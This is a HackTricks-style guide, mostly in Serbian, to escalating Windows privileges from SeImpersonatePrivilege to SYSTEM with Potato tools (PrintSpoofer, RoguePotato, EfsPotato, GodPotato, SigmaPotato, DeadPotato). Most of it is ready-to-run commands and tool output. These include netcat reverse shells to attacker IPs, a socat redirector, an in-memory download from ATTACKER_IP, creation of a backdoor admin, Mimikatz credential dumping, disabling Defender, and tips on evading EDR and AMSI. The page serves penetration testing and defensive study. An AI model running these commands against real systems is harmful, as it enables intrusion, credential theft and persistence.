# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato doesn't work** na Windows Server 2019 i Windows 10 build 1809 i novijim. Međutim, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** mogu da se koriste za iskorišćavanje istih privilegija i dobijanje pristupa na nivou `NT AUTHORITY\SYSTEM`. Ovaj [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) daje detaljno objašnjenje alata `PrintSpoofer`, koji se može koristiti za zloupotrebu impersonation privilegija na Windows 10 i Server 2019 hostovima gde JuicyPotato više ne radi.

> [!TIP]
> Moderan alternativ koji se često održava u 2024–2025 je SigmaPotato (fork of GodPotato) koji dodaje in-memory/.NET reflection korišćenje i proširenu podršku za OS. Pogledajte brzu upotrebu ispod i repo u References.

Related pages for background and manual techniques:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Requirements and common gotchas

Sve sledeće tehnike zasnivaju se na zloupotrebi privilegisanog servisa koji podržava impersonaciju iz konteksta koji poseduje jednu od sledećih privilegija:

- SeImpersonatePrivilege (najčešća) or SeAssignPrimaryTokenPrivilege
- High integrity is not required if the token already has SeImpersonatePrivilege (typical for many service accounts such as IIS AppPool, MSSQL, etc.)

Brzo proverite privilegije:
```cmd
whoami /priv | findstr /i impersonate
```
Operativne napomene:

- Ako vaša shell sesija radi pod ograničenim tokenom koji nema SeImpersonatePrivilege (što je često za Local Service/Network Service u nekim kontekstima), povratite podrazumevane privilegije naloga koristeći FullPowers, pa onda pokrenite Potato. Primer: `FullPowers.exe -c "cmd /c whoami /priv" -z`
- PrintSpoofer zahteva da Print Spooler service radi i da mu se pristupa preko lokalnog RPC endpointa (spoolss). U ojačanim okruženjima gde je Spooler onemogućen nakon PrintNightmare, dajte prednost RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- RoguePotato zahteva OXID resolver dostupan na TCP/135. Ako je egress blokiran, koristite redirector/port-forwarder (vidi primer dole). Starije verzije su zahtevale -f flag.
- EfsPotato/SharpEfsPotato zloupotrebljavaju MS-EFSR; ako je jedan pipe blokiran, pokušajte alternativne pipe-ove (lsarpc, efsrpc, samr, lsass, netlogon).
- Error 0x6d3 tokom RpcBindingSetAuthInfo obično ukazuje na nepoznat ili nepodržan RPC servis za autentifikaciju; probajte drugi pipe/transport ili proverite da li ciljana usluga radi.
- “Kitchen-sink” forkovi kao što je DeadPotato uključuju dodatne payload module (Mimikatz/SharpHound/Defender off) koji upisuju na disk; očekujte veću detekciju od strane EDR-a u poređenju sa lakšim originalima.

## Quick Demo

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
Napomene:
- Možete koristiti -i da pokrenete interaktivni proces u trenutnoj konzoli, ili -c da pokrenete one-liner.
- Zahteva Spooler service. Ako je onemogućen, ovo neće uspeti.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
Ako je outbound 135 blokiran, pivot the OXID resolver via socat na vašem redirectoru:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### PrintNotifyPotato

PrintNotifyPotato je noviji COM abuse primitive objavljen krajem 2022. koji cilja servis **PrintNotify** umesto Spooler/BITS. Binarni fajl instancira PrintNotify COM server, umeće lažni `IUnknown`, a zatim pokreće privilegovani callback preko `CreatePointerMoniker`. Kada se PrintNotify servis (pokrenut kao **SYSTEM**) poveže nazad, proces duplicira vraćeni token i pokreće isporučeni payload sa punim privilegijama.

Key operational notes:

* Radi na Windows 10/11 i Windows Server 2012–2022 sve dok je instaliran Print Workflow/PrintNotify servis (prisutan je čak i kada je legacy Spooler onemogućen nakon PrintNightmare).
* Zahtijeva da kontekst poziva poseduje **SeImpersonatePrivilege** (tipično za IIS APPPOOL, MSSQL i servisne naloge zakazanih zadataka).
* Prihvata direktnu komandu ili interaktivni režim kako biste ostali u originalnoj konzoli. Primer:

```cmd
PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
PrintNotifyPotato.exe whoami
```

* Pošto je isključivo COM-based, nisu potrebni named-pipe listeneri ili eksterni redirectori, što ga čini drop-in zamenom na hostovima gde Defender blokira RoguePotato’s RPC binding.

Operatori poput Ink Dragon pokreću PrintNotifyPotato odmah nakon ostvarenog ViewState RCE na SharePoint-u, kako bi pivotirali iz procesa `w3wp.exe` na **SYSTEM** pre instalacije ShadowPad.

### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
Savet: Ako jedan pipe zakaže ili ga EDR blokira, pokušajte druge podržane pipes:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
Napomene:
- Radi na Windows 8/8.1–11 i Server 2012–2022 kada je prisutno SeImpersonatePrivilege.

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato pruža dve varijante koje ciljaju servisne DCOM objekte koji podrazumevano koriste RPC_C_IMP_LEVEL_IMPERSONATE. Sastavite ili koristite priložene binarne fajlove i pokrenite svoju komandu:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (updated GodPotato fork)

SigmaPotato dodaje moderne pogodnosti kao što su in-memory execution putem .NET reflection i PowerShell reverse shell helper.
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
Dodatne pogodnosti u verzijama 2024–2025 (v1.2.x):
- Ugrađena opcija reverse shell `--revshell` i uklanjanje ograničenja od 1024 znaka u PowerShellu tako da možete poslati duge AMSI-bypassing payloads odjednom.
- Reflection-friendly sintaksa (`[SigmaPotato]::Main()`), plus rudimentaran trik za izbegavanje AV-a preko `VirtualAllocExNuma()` da zbuni jednostavne heuristike.
- Odvojeni `SigmaPotatoCore.exe` kompajliran protiv .NET 2.0 za PowerShell Core okruženja.

### DeadPotato (2024 GodPotato prepravka sa modulima)

DeadPotato zadržava GodPotato OXID/DCOM impersonation chain, ali ugrađuje post-exploitation pomoćne module tako da operatori mogu odmah preuzeti SYSTEM i obaviti persistence/collection bez dodatnih alata.

Uobičajeni moduli (svi zahtevaju SeImpersonatePrivilege):

- `-cmd "<cmd>"` — pokrene proizvoljnu komandu kao SYSTEM.
- `-rev <ip:port>` — brz reverse shell.
- `-newadmin user:pass` — kreira lokalnog admina za persistence.
- `-mimi sam|lsa|all` — spusti i pokrene Mimikatz da izvadi kredencijale (dodiruje disk, bučno).
- `-sharphound` — pokrene SharpHound collection kao SYSTEM.
- `-defender off` — isključi Defender real-time protection (veoma bučno).

Primeri one-linera:
```cmd
# Blind reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Drop an admin for later login
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound immediately after priv-esc
DeadPotato.exe -sharphound
```
Pošto sadrži dodatne binarne datoteke, očekujte više AV/EDR flags; koristite tanji GodPotato/SigmaPotato kada je stealth bitan.

## Reference

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [FullPowers – Restore default token privileges for service accounts](https://github.com/itm4n/FullPowers)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [DeadPotato – GodPotato rework with built-in post-ex modules](https://github.com/lypd0/DeadPotato)

{{#include ../../banners/hacktricks-training.md}}
